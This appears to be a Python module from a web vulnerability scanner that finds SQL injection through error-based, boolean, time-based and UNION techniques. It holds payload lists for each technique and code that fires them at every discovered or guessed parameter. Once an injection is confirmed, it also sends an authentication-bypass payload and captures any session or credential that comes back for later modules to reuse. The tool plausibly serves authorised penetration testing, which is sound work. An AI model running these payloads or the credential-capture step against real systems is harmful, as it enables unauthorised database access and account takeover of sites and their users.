"""
SQLiModule — Real SQL Injection detection engine.

Detection methods (in order of reliability):
  1. Error-based   — DB error strings appear in response
  2. Boolean-based — response differs between true/false conditions (Validator differential_test)
  3. Time-based    — SLEEP/WAITFOR causes measurable delay (Validator validate_time_based, Z-score)
  4. Union-based   — column-count brute force + sentinel reflection via UNION SELECT

Injection points tested (unified across every technique):
  - GET query string params (crawled + common-name guesses)
  - POST form-encoded params (from discovered HTML forms)
  - JSON request body properties (from an OpenAPI/Swagger spec, see modules/recon.py)
  - XML request body fields (from an OpenAPI/Swagger spec)
  - URL path segments (e.g. /user/{id}, from an OpenAPI/Swagger spec)

Zero false positives policy:
  - Error-based:  only report when a known DB error string is found, and wasn't already in baseline
  - Boolean:      Validator.differential_test — true≈baseline, false≠baseline, control recovers
  - Time-based:   Validator.validate_time_based — Z-score >= 3.5 against measured jitter, control recovers
  - Union-based:  sentinel value must be reflected verbatim in the response body
"""

import random
import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from core.validator import Validator


# ─── Error signatures per database ───────────────────────────────────────────

DB_ERRORS = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"mysql_fetch_array\(\)",
        r"mysql_num_rows\(\)",
        r"supplied argument is not a valid mysql",
        r"column count doesn't match",
        r"unknown column",
        r"mysql server version for the right syntax",
        r"mysql_fetch",
        r"division by zero",
    ],
    "PostgreSQL": [
        r"pg_query\(\)",
        r"pg_exec\(\)",
        r"postgresql.*error",
        r"unterminated quoted string",
        r"syntax error at or near",
        r"invalid input syntax for",
        r"pg_fetch_array",
        r"division by zero",
    ],
    "MSSQL": [
        r"unclosed quotation mark after the character string",
        r"incorrect syntax near",
        r"microsoft sql server",
        r"mssql_query\(\)",
        r"odbc sql server driver",
        r"sqlstate\[42000\]",
        r"syntax error converting",
        r"\[sqlserver\]",
    ],
    "Oracle": [
        r"ora-\d{4,5}",
        r"oracle error",
        r"oracle.*driver",
        r"oracle.*exception",
        r"quoted string not properly terminated",
        r"sql command not properly ended",
    ],
    "SQLite": [
        r"sqlite_exception",
        r"sqlite error",
        r"sqlite3::",
        r"system.data.sqlite",
        r"unrecognized token",
        r"sqlite3\.operationalerror",
        r"near \x22.*\x22: syntax error",
        r"no such column",
        r"no such table",
    ],
    "Generic": [
        r"sql syntax",
        r"sql error",
        r"syntax error.*sql",
        r"database error",
        r"db error",
        r"query failed",
        r"invalid query",
        r"unexpected end of sql command",
        r"error in your query",
        r"traceback \(most recent call last\)",  # Python stack trace often leaks the query
    ],
}

# Flatten for quick searching
ALL_ERROR_PATTERNS = []
DB_ERROR_MAP = {}
for db, patterns in DB_ERRORS.items():
    for p in patterns:
        ALL_ERROR_PATTERNS.append(re.compile(p, re.I))
        DB_ERROR_MAP[p] = db


# ─── Payload sets ─────────────────────────────────────────────────────────────

# Error-triggering payloads
ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "';",
    "'--",
    "'-- -",
    "' OR '1'='1",
    "' OR 1=1--",
    "1'",
    "1\"",
    "1`",
    "1\\",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=1--",
    "' AND SLEEP(0)--",
    "1' AND '1'='1",
    "admin'--",
    "') OR ('1'='1",
    "1; SELECT 1",
    "1 UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 999--",    # Column count error
]

# Boolean condition pairs (true_payload, false_payload)
BOOLEAN_PAIRS = [
    ("' OR '1'='1'--",      "' OR '1'='2'--"),
    ("' OR 1=1--",          "' OR 1=2--"),
    ("1' AND '1'='1'--",    "1' AND '1'='2'--"),
    ("1 AND 1=1",           "1 AND 1=2"),
    ("1' AND 1=1--",        "1' AND 1=2--"),
    ("' OR 'x'='x",         "' OR 'x'='y"),
    ("1 OR 1=1",            "1 OR 1=2"),
]

# Time-based payloads (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)
TIME_PAYLOADS = [
    ("' AND SLEEP(4)--",                4, "MySQL"),
    ("' AND SLEEP(4)-- -",              4, "MySQL"),
    ("1' AND SLEEP(4)--",               4, "MySQL"),
    ("'; WAITFOR DELAY '0:0:4'--",      4, "MSSQL"),
    ("1; WAITFOR DELAY '0:0:4'--",      4, "MSSQL"),
    ("' OR SLEEP(4)--",                 4, "MySQL"),
    ("1 AND SLEEP(4)",                  4, "MySQL"),
    ("'; SELECT pg_sleep(4)--",         4, "PostgreSQL"),
    ("' AND 1=(SELECT 1 FROM pg_sleep(4))--", 4, "PostgreSQL"),
    ("' OR 1=1 AND SLEEP(4)--",         4, "MySQL"),
]


from modules import BaseModule


class SQLiModule(BaseModule):
    NAME = "SQLi Scanner"

    def __init__(self, target, db, ui, context, timeout=12, delay=0.3,
                 threads=5, verbose=False, ai=None, output_dir=None):
        self.target     = target
        self.db         = db
        self.ui         = ui
        self.ctx        = context
        self.timeout    = timeout
        self.delay      = delay
        self.threads    = threads
        self.verbose    = verbose
        self.ai         = ai
        self.output_dir = output_dir
        self.base_url   = self.ctx.get("base_url") or (
            f"https://{target}" if not target.startswith("http") else target
        )
        self.session    = self._make_session()
        self.found      = []
        self.validator  = Validator(
            baseline=self.ctx.get("baseline_profile"), ai=self.ai, ui=self.ui,
        )

    def _make_session(self):
        if not requests:
            return None
        s = requests.Session()
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        s.verify = False
        return s

    # ─────────────────────────────────────────────────────────────────────────
    def run(self):
        self.ui.section("SQLi Scanner — SQL Injection Detection")
        if not requests:
            self.ui.error("requests not installed. Run: pip install requests")
            return

        try:
            import urllib3
            urllib3.disable_warnings()
        except Exception:
            pass

        endpoints = self._collect_endpoints()
        api_count = sum(1 for e in endpoints if e["param_type"] in ("json", "xml", "path"))
        self.ui.info(
            f"Testing {len(endpoints)} injection point(s) for SQL injection"
            + (f" ({api_count} from OpenAPI/Swagger spec)" if api_count else "")
        )

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self._test_endpoint, ep): ep for ep in endpoints}
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as e:
                    if self.verbose:
                        self.ui.error(f"SQLi thread error: {e}")

        if not self.found:
            self.ui.info("No confirmed SQL injection vulnerabilities found.")
        else:
            self.ui.ok(f"SQLi scan complete — {len(self.found)} confirmed finding(s)")

    # ─────────────────────────────────────────────────────────────────────────
    # Endpoint collection — builds a unified list of injection-point dicts:
    #   {url, method, param, param_type, original_value, other_params, headers,
    #    [url_template for path type], [xml_template/xml_marker for xml type]}
    # ─────────────────────────────────────────────────────────────────────────
    def _collect_endpoints(self):
        endpoints = []
        seen = set()
        auth_headers = self.ctx.get("auth_headers", {})

        raw_eps = self.ctx.get("endpoints", []) + self.ctx.get("urls", [])
        if not raw_eps:
            raw_eps = [self.base_url]

        # Parse existing GET params
        for ep in raw_eps:
            try:
                if not ep.startswith("http"):
                    ep = self.base_url.rstrip("/") + "/" + ep.lstrip("/")
                parsed = urllib.parse.urlparse(ep)
                qs = urllib.parse.parse_qs(parsed.query)
                if qs:
                    base_url = parsed.scheme + "://" + parsed.netloc + parsed.path
                    for param, vals in qs.items():
                        key = (base_url, param, "GET")
                        if key not in seen:
                            seen.add(key)
                            endpoints.append({
                                "url": base_url, "method": "GET", "param": param,
                                "param_type": "query", "original_value": vals[0],
                                "other_params": {k: v[0] for k, v in qs.items() if k != param},
                                "headers": {},
                            })
            except Exception:
                continue

        # Probe common numeric and string params
        common_int_params  = ["id", "page", "pid", "uid", "user_id", "item", "product",
                               "cat", "category", "p", "post", "article", "news", "thread"]
        common_str_params  = ["q", "search", "s", "query", "name", "username", "email",
                               "keyword", "title", "filter", "sort", "order", "lang"]

        for p in common_int_params:
            key = (self.base_url, p, "GET")
            if key not in seen:
                seen.add(key)
                endpoints.append({
                    "url": self.base_url, "method": "GET", "param": p,
                    "param_type": "query", "original_value": "1",
                    "other_params": {}, "headers": {},
                })

        for p in common_str_params:
            key = (self.base_url, p, "GET")
            if key not in seen:
                seen.add(key)
                endpoints.append({
                    "url": self.base_url, "method": "GET", "param": p,
                    "param_type": "query", "original_value": "test",
                    "other_params": {}, "headers": {},
                })

        # Forms from context (HTML forms — form-encoded body)
        for form in self.ctx.get("forms", []):
            furl   = form.get("action", self.base_url)
            method = form.get("method", "POST").upper()
            for inp in form.get("inputs", {}).keys():
                key = (furl, inp, method)
                if key not in seen:
                    seen.add(key)
                    endpoints.append({
                        "url": furl, "method": method, "param": inp,
                        "param_type": "form", "original_value": "1",
                        "other_params": {k: v for k, v in form.get("inputs", {}).items() if k != inp},
                        "headers": {},
                    })

        # API endpoints from an OpenAPI/Swagger spec (modules/recon.py._discover_api_spec)
        for api_ep in self.ctx.get("api_endpoints", []):
            endpoints.extend(self._expand_api_endpoint(api_ep, auth_headers, seen))

        return endpoints

    def _expand_api_endpoint(self, api_ep, auth_headers, seen):
        """Turn one OpenAPI operation into one or more injection-point dicts."""
        out = []
        method = api_ep.get("method", "GET")
        headers = dict(auth_headers)
        for name, example in api_ep.get("header_params", []):
            if example:
                headers[name] = str(example)

        path_params  = api_ep.get("path_params", [])
        query_params = api_ep.get("query_params", [])
        json_props   = api_ep.get("json_props", [])
        url_template = api_ep.get("url", "")

        def resolved_url(skip=None):
            u = url_template
            for pname, pexample in path_params:
                if pname == skip:
                    continue
                default = str(pexample) if pexample else "1"
                u = u.replace("{" + pname + "}", urllib.parse.quote(default, safe=""))
            return u

        # Path-segment params
        for pname, pexample in path_params:
            key = (url_template, pname, method, "path")
            if key in seen:
                continue
            seen.add(key)
            out.append({
                "url_template": resolved_url(skip=pname), "method": method,
                "param": pname, "param_type": "path",
                "original_value": str(pexample) if pexample else "1",
                "other_params": {}, "headers": headers,
            })

        # Query params documented on an API operation (may not be crawlable)
        base_resolved = resolved_url()
        for qname, qexample in query_params:
            key = (base_resolved, qname, method, "query")
            if key in seen:
                continue
            seen.add(key)
            out.append({
                "url": base_resolved, "method": method, "param": qname,
                "param_type": "query", "original_value": str(qexample) if qexample else "test",
                "other_params": {}, "headers": headers,
            })

        # JSON body properties
        for prop in json_props:
            key = (base_resolved, prop, method, "json")
            if key in seen:
                continue
            seen.add(key)
            out.append({
                "url": base_resolved, "method": method, "param": prop,
                "param_type": "json", "original_value": "test",
                "other_params": {p: "test" for p in json_props if p != prop},
                "headers": headers,
            })

        # XML body field
        if api_ep.get("xml_template") and api_ep.get("xml_field"):
            key = (base_resolved, api_ep["xml_field"], method, "xml")
            if key not in seen:
                seen.add(key)
                out.append({
                    "url": base_resolved, "method": method, "param": api_ep["xml_field"],
                    "param_type": "xml", "original_value": "test",
                    "other_params": {}, "headers": headers,
                    "xml_template": api_ep["xml_template"],
                })

        return out

    # ─────────────────────────────────────────────────────────────────────────
    def _test_endpoint(self, ep):
        # 1. Get baseline response. Must check `is None`, not truthiness —
        # requests.Response is falsy for ANY non-2xx status (bool(resp) ==
        # resp.ok), and a 401/403/500 baseline (e.g. a login endpoint tested
        # with wrong credentials) is a perfectly valid, meaningful baseline.
        baseline = self._send(ep, ep["original_value"])
        if baseline is None:
            return

        # 2. Error-based detection
        result = self._test_error_based(ep, baseline)
        if result:
            self._report_finding(ep, result["payload"], result["technique"],
                                  result["db_type"], result.get("evidence", ""),
                                  "critical", "9.8")
            return  # Don't pile on more findings for same param

        # 3. Boolean-based detection (via Validator differential_test)
        result = self._test_boolean_based(ep)
        if result:
            self._report_finding(ep, result["payload"], result["technique"],
                                  result["db_type"], result.get("evidence", ""),
                                  "high", "8.8")
            return

        # 4. Time-based detection (via Validator validate_time_based)
        result = self._test_time_based(ep)
        if result:
            self._report_finding(ep, result["payload"], result["technique"],
                                  result["db_type"], result.get("evidence", ""),
                                  "critical", "9.8")
            return

        # 5. Union-based detection (query/form/json injection points only)
        if ep["param_type"] in ("query", "form", "json"):
            result = self._test_union_based(ep, baseline)
            if result:
                self._report_finding(ep, result["payload"], result["technique"],
                                      result["db_type"], result.get("evidence", ""),
                                      "critical", "9.8")

    # ─────────────────────────────────────────────────────────────────────────
    def _test_error_based(self, ep, baseline):
        base_db, _ = self._check_db_errors(baseline.text)
        for payload in ERROR_PAYLOADS:
            try:
                resp = self._send(ep, payload)
                if resp is None:
                    continue

                db_type, matched_pattern = self._check_db_errors(resp.text)
                if db_type:
                    if base_db:
                        continue  # Error in baseline too — not injected

                    if self.ai and self.ai.enabled:
                        try:
                            verdict = self.ai.analyze_sqli_error(ep["url"], ep["param"], resp.text)
                            if verdict:
                                self.ui.ai(verdict.split("\n")[0][:200])
                        except Exception:
                            pass

                    if self.verbose:
                        self.ui.warn(f"Error-based SQLi: {ep.get('url') or ep.get('url_template')} param={ep['param']} DB={db_type}")
                    return {
                        "payload": payload, "technique": "Error-based", "db_type": db_type,
                        "evidence": f"DB error pattern matched: {matched_pattern}",
                    }

                time.sleep(self.delay)
            except Exception:
                continue
        return None

    def _test_boolean_based(self, ep):
        def send_fn(value):
            return self._send(ep, value)

        for true_payload, false_payload in BOOLEAN_PAIRS:
            try:
                result = self.validator.differential_test(
                    url=ep.get("url", ""), param=ep["param"],
                    true_payload=true_payload, false_payload=false_payload,
                    baseline_value=ep["original_value"], timeout=self.timeout,
                    send_fn=send_fn,
                )
            except Exception:
                continue

            if result.get("valid") and result.get("confidence_score", 0) >= 75:
                if self.verbose:
                    self.ui.warn(f"Boolean SQLi candidate: {ep.get('url') or ep.get('url_template')} param={ep['param']} — {result['details']}")
                return {
                    "payload": true_payload, "technique": "Boolean-based blind",
                    "db_type": "Unknown (boolean inference)", "evidence": result["details"],
                }
            time.sleep(self.delay)
        return None

    def _test_time_based(self, ep):
        def send_fn(value, t):
            return self._send(ep, value, timeout=t)

        for payload, sleep_sec, db_type in TIME_PAYLOADS:
            try:
                result = self.validator.validate_time_based(
                    url=ep.get("url", ""), param=ep["param"], delay_payload=payload,
                    expected_delay=sleep_sec, baseline_value=ep["original_value"],
                    timeout=self.timeout, send_fn=send_fn,
                )
            except Exception:
                continue

            if result.get("valid") and result.get("confidence_score", 0) >= 75:
                if self.verbose:
                    self.ui.warn(f"Time-based SQLi confirmed (Z={result.get('z_score', 0):.1f}): "
                                 f"{ep.get('url') or ep.get('url_template')} param={ep['param']}")
                return {
                    "payload": payload, "technique": f"Time-based blind ({db_type})",
                    "db_type": db_type, "evidence": result["details"],
                }
            time.sleep(self.delay)
        return None

    def _test_union_based(self, ep, baseline):
        orig = ep["original_value"]

        # 1. Brute-force column count via ORDER BY
        col_count = None
        for n in range(1, 11):
            resp = self._send(ep, f"{orig}' ORDER BY {n}-- -")
            if resp is None:
                return None
            db_type, _ = self._check_db_errors(resp.text)
            structurally_different = (
                self.validator._structural_hash(resp.text) != self.validator._structural_hash(baseline.text)
                and abs(len(resp.text) - len(baseline.text)) > max(30, len(baseline.text) * 0.02)
            )
            if db_type or resp.status_code >= 500 or structurally_different:
                col_count = n - 1
                break
            time.sleep(self.delay)

        if not col_count or col_count < 1 or col_count > 9:
            return None

        # 2. Inject a unique sentinel into each column via UNION SELECT
        sentinel = f"grunion{random.randint(100000, 999999)}"
        cols = ", ".join(f"'{sentinel}c{i}'" for i in range(col_count))
        payload = f"{orig}' UNION SELECT {cols}-- -"
        resp = self._send(ep, payload)
        if resp and sentinel in resp.text:
            if self.verbose:
                self.ui.warn(f"Union-based SQLi confirmed: {ep.get('url') or ep.get('url_template')} param={ep['param']} cols={col_count}")
            return {
                "payload": payload, "technique": f"Union-based ({col_count} columns)",
                "db_type": "Unknown (union inference)",
                "evidence": f"Sentinel value '{sentinel}' injected via UNION SELECT ({col_count} columns) "
                            f"reflected verbatim in the response body.",
            }
        return None

    # ─────────────────────────────────────────────────────────────────────────
    def _send(self, ep, value, timeout=None):
        """Deliver one probe value into ep's injection point. Returns a response or None."""
        t = timeout or self.timeout
        method = ep["method"]
        # Live-captured/user-supplied auth always applies, on top of whatever
        # per-endpoint headers came from the OpenAPI spec — re-read on every
        # call (not cached) so a credential captured mid-scan (e.g. this very
        # module's own auth-bypass finding) immediately applies to every
        # request after it, including ones later in this same module.
        headers = {**self.auth_headers(), **(ep.get("headers") or {})}
        cookies = self.auth_cookies()
        param_type = ep["param_type"]

        try:
            if param_type in ("query", "form"):
                params = {**ep.get("other_params", {}), ep["param"]: value}
                if method == "GET":
                    return self.session.get(ep["url"], params=params, timeout=t, headers=headers, cookies=cookies)
                return self.session.request(method, ep["url"], data=params, timeout=t, headers=headers, cookies=cookies)

            elif param_type == "json":
                body = {**ep.get("other_params", {}), ep["param"]: value}
                return self.session.request(method, ep["url"], json=body, timeout=t, headers=headers, cookies=cookies)

            elif param_type == "path":
                url = ep["url_template"].replace(
                    "{" + ep["param"] + "}", urllib.parse.quote(str(value), safe="")
                )
                return self.session.request(method, url, timeout=t, headers=headers, cookies=cookies)

            elif param_type == "xml":
                body = ep["xml_template"].replace("__GR_INJECT__", str(value))
                h = {**headers, "Content-Type": "application/xml"}
                return self.session.request(method, ep["url"], data=body.encode("utf-8", "ignore"),
                                             timeout=t, headers=h, cookies=cookies)
        except RequestException:
            return None
        return None

    def _check_db_errors(self, body):
        body_lower = body.lower()
        for db, patterns in DB_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, body_lower):
                    return db, pattern
        return None, None

    # ─────────────────────────────────────────────────────────────────────────
    def _report_finding(self, ep, payload, technique, db_type, evidence, severity, cvss):
        param  = ep["param"]
        method = ep["method"]
        url    = ep.get("url") or ep.get("url_template", "")
        loc    = {"query": "GET parameter", "form": "form field",
                  "json": "JSON body property", "xml": "XML body field",
                  "path": "URL path segment"}.get(ep["param_type"], "parameter")

        title = f"SQL Injection ({technique}) in '{param}' {loc}"
        desc  = (
            f"The '{param}' {loc} in a {method} request to {url} is vulnerable to "
            f"{technique} SQL injection. Database fingerprinted as: {db_type}. "
            f"An attacker can extract the entire database, bypass authentication, "
            f"read/write server files, and potentially achieve remote code execution."
        )
        remediation = (
            "1. Use parameterized queries / prepared statements — NEVER concatenate user input into SQL. "
            "2. Apply input validation and whitelist expected value formats. "
            "3. Use an ORM that handles escaping automatically. "
            "4. Limit DB user permissions (principle of least privilege). "
            "5. Enable WAF rules for SQL injection patterns."
        )
        refs = [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://portswigger.net/web-security/sql-injection",
        ]

        added = self.db.add(
            title=title,
            severity=severity,
            url=url,
            module=self.NAME,
            description=desc,
            remediation=remediation,
            cvss=cvss,
            evidence=[evidence] if evidence else [],
            references=refs,
            confidence="high",
        )
        if added:
            self.found.append(url)
            self.ui.find(severity, title, url)
            self.ui.bullet(f"{loc.title()}: {param}  |  Technique: {technique}  |  DB: {db_type}", indent=12)
            self.ui.bullet(f"Payload: {payload}", indent=12)
            self.ui.bullet(f"Evidence: {evidence}", indent=12)
            self.ctx.setdefault("sqli_findings", []).append({
                "url": url, "param": param, "payload": payload,
                "technique": technique, "db_type": db_type,
            })

            # Regardless of which technique actually confirmed this SQLi
            # (error-based fires first and short-circuits before boolean-
            # based ever runs), make one extra attempt with a classic
            # auth-bypass payload. If this is a login-style endpoint it
            # often succeeds even when the *confirming* payload was just a
            # syntax-error probe, and may hand back a live session/token
            # that every module running after this one can reuse instead of
            # testing authenticated-only endpoints blind.
            if ep["param_type"] in ("query", "form", "json"):
                try:
                    bypass_resp = self._send(ep, "' OR '1'='1'--")
                    self.try_capture_credential_from_response(
                        bypass_resp, source=f"SQLi ({technique}) confirmed bypass probe on '{param}' @ {url}",
                    )
                except Exception:
                    pass
